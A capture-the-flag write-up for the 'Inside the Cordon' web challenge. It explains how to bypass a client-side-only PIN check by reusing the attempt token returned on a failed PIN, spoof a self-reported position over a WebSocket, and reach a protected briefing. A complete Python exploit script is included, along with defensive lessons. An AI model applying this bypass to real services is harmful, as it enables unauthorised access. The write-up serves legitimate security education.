# Inside the Cordon — CTF Writeup

**Challenge:** Inside the Cordon
**Event:** CSCTF 2026
**Category:** Web / Misc

---

## Scenario

> A seized coordination station was used to get inside Cordon Seven while the national fuel corridor that feeds allied units in Operation Dawn was being rerouted. The operator PIN is gone.

We are handed a single cookie `station` and a web app. The brief says to reproduce the access path and recover the protected briefing.

---

## Recon

### Session cookie

```
station=tuOvrQnA18gteHMkZmQ-tW53uKbGa68h7aP7VSetmh8
```

Hex form:

```
b6e3afad09c0d7c82d78732466643eb56e77b8a6c66baf21eda3fb5527ad9a1f
```

32 bytes → opaque server-side session identifier. It rotates roughly every 5 minutes and is tied to a server-side state machine.

### PIN endpoint

The app submits the operator PIN via:

```
POST /api/station/pin-check
Content-Type: application/json

{ "pin": "000000" }
```

Response on failure:

```json
{
  "success": false,
  "code": "PIN_MISMATCH",
  "attempt": "5Ho6g43uG-E103cgt0wv6Q",
  "expires_in_ms": 60000
}
```

Two observations:

1. The error is structured with a `code` field, so the server exposes a state machine.
2. **On failure the server still issues a valid `attempt` token.** This is the crux of the challenge.

---

## The three bugs

The challenge ships a JS file that exposes all three:

### Bug 1 — Trust boundary in the wrong place

```js
// Deliberately wrong trust boundary: the browser's local branch decides whether to activate.
const attempt = result.attempt;
if (!result.success) { pinStatus.textContent = `PIN rejected (${result.code}). …`; return; }
const activation = await fetch('/api/station/activate', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({attempt})
});
```

The client is the only thing stopping activation on a bad PIN. The server's `/activate` endpoint **only checks that `attempt` is a valid ticket**, not that the ticket was issued for a correct PIN.

⇒ We do not need to recover the PIN at all.

### Bug 2 — Station self-reports its position

```js
function reportOutside() {
  send({type:'position.update', sequence: nextSequence++, observed_at_ms: Date.now(),
        latitude:-47.200610, longitude:-126.302400, accuracy_m:18.0});
}
```

The station always reports a hardcoded point **outside** Cordon Seven. Eligibility (`eligible_room`) is only granted when the reported position is inside the cordon (centre `lat_e6`, `lon_e6`, radius `radius_m` from the activate response).

Because the position is client-supplied, we can simply send the cordon centre.

### Bug 3 — Eligibility is consumed by the next frame

This one isn't a code bug; it's protocol semantics. The server grants eligibility on a successful inside `position.update`, but **the eligibility is invalidated by the next frame you send that isn't `room.join`**. Any probe in between (`BAD_MESSAGE` errors) burns the window.

⇒ The winning sequence must be: `position.update (inside)` → `room.join` **immediately**, with no other frames in between.

---

## Exploit chain

### 1. Get a ticket for a wrong PIN

```
POST /api/station/pin-check  { "pin": "000000" }
→ { success:false, code:"PIN_MISMATCH", attempt:"<ticket>" }
```

### 2. Skip the client's early return and call activate

```
POST /api/station/activate  { "attempt": "<ticket>" }
→ {
    success:true, code:"STATION_ACTIVE",
    cap:"<capability>",
    lat_e6:-47203945, lon_e6:-126300000, radius_m:75,
    room:"cordon-seven",
    server_time_ms:...
  }
```

This step is the exploit proper — the server trusts the `attempt` ticket, which was issued for a **failed** PIN.

### 3. Connect to the station WebSocket

```
wss://<host>/ws
Cookie: station=<current station cookie>
```

```json
{ "type":"station.authenticate", "sequence":1, "cap":"<capability>" }
```

Response:

```json
{
  "type":"station.accepted",
  "next_sequence":2,
  "freshness_ms":10000,
  "eligibility_ttl_ms":60000,
  "limit":120,
  "window_ms":60000
}
```

### 4. Report an inside position

Send the cordon centre returned by `activate`, not the hardcoded outside point.

```json
{
  "type":"position.update",
  "sequence":2,
  "observed_at_ms":<now_ms>,
  "latitude":-47.203945,
  "longitude":-126.3,
  "accuracy_m":5.0
}
```

Response:

```json
{
  "type":"position.accepted",
  "sequence":2,
  "inside":true,
  "distance_m":0.0,
  "eligible_room":"cordon-seven",
  "eligibility_expires_ms":<now+60000>,
  "next_sequence":3
}
```

### 5. Immediately join the room

```json
{ "type":"room.join", "sequence":3, "room":"cordon-seven" }
```

The server replies with the protected briefing:

```json
{
  "type":"room.snapshot",
  "classification":"…",
  "briefing":"…",
  "clearance_token":"…"
}
```

The `briefing` (and/or `clearance_token`) is the flag.

---

## Why the PIN is irrelevant

The PIN is a decoy. Every path we tried to *recover* it ran into:

- a 60-second `attempt` TTL,
- a per-session rate limit,
- a rotating `station` cookie.

But the client and server disagree about what an `attempt` is for:

- Client: "only activate if `result.success` was true."
- Server: "activate if `attempt` is a valid unused ticket."

The mismatch is the intended path: submit a wrong PIN, take the ticket, call `/activate` yourself.

---

## Complete exploit

```python
#!/usr/bin/env python3
# pip install requests websocket-client
import json, time, ssl
import requests, websocket

BASE = "https://<host>"
HOST = "<host>"
STATION_SEED = "<initial station cookie>"

# 1. wrong pin → attempt
s = requests.Session()
s.cookies.set("station", STATION_SEED)
attempt = s.post(f"{BASE}/api/station/pin-check",
                 json={"pin":"000000"}).json()["attempt"]

# 2. activate (skip the client-side trust check)
st = s.post(f"{BASE}/api/station/activate",
            json={"attempt": attempt}).json()
cap, room = st["cap"], st["room"]
lat, lon = st["lat_e6"]/1e6, st["lon_e6"]/1e6
station = [c.value for c in s.cookies if c.name == "station"][-1]

# 3. websocket
ws = websocket.create_connection(
    f"wss://{HOST}/ws",
    header=[f"Cookie: station={station}"],
    suppress_origin=True,
    sslopt={"cert_reqs": ssl.CERT_NONE},
    timeout=5,
)

def send(o): ws.send(json.dumps(o))
def recv():
    ws.settimeout(5)
    try: return json.loads(ws.recv())
    except Exception: return None

send({"type":"station.authenticate","sequence":1,"cap":cap})
seq = recv()["next_sequence"]

# 4. inside position
send({"type":"position.update","sequence":seq,
      "observed_at_ms": int(time.time()*1000),
      "latitude": lat, "longitude": lon, "accuracy_m": 5.0})
seq = recv()["next_sequence"]

# 5. immediately join — no frames in between
send({"type":"room.join","sequence":seq,"room":room})

# 6. read briefing
snap = recv()
print(snap["briefing"])
print(snap["clearance_token"])
```

---

## Lessons

- **Client-side authorization is not authorization.** When a UI can be told to skip a call, the call it skips is the whole security boundary.
- **"One-time" tokens issued on failure are still valid tokens** unless the server explicitly ties them to the failing condition. An `attempt` returned by `PIN_MISMATCH` should be useless; here it wasn't.
- **Stateful protocols need to specify invalidation.** "Eligibility granted on inside position" reads as a lease, but the lease is consumed by the next frame. Read the error codes: `BAD_MESSAGE` vs `NOT_ELIGIBLE` distinguishes "unknown type" from "known type, wrong state," and that distinction is often the intended answer.
- **The narrative was the hint.** "The operator PIN is gone" and "reproduce the access path" were literal. The challenge never asked us to find the PIN — it asked us to bypass the only thing checking it.

---

## Flag

Extracted from `room.snapshot.briefing` / `room.snapshot.clearance_token`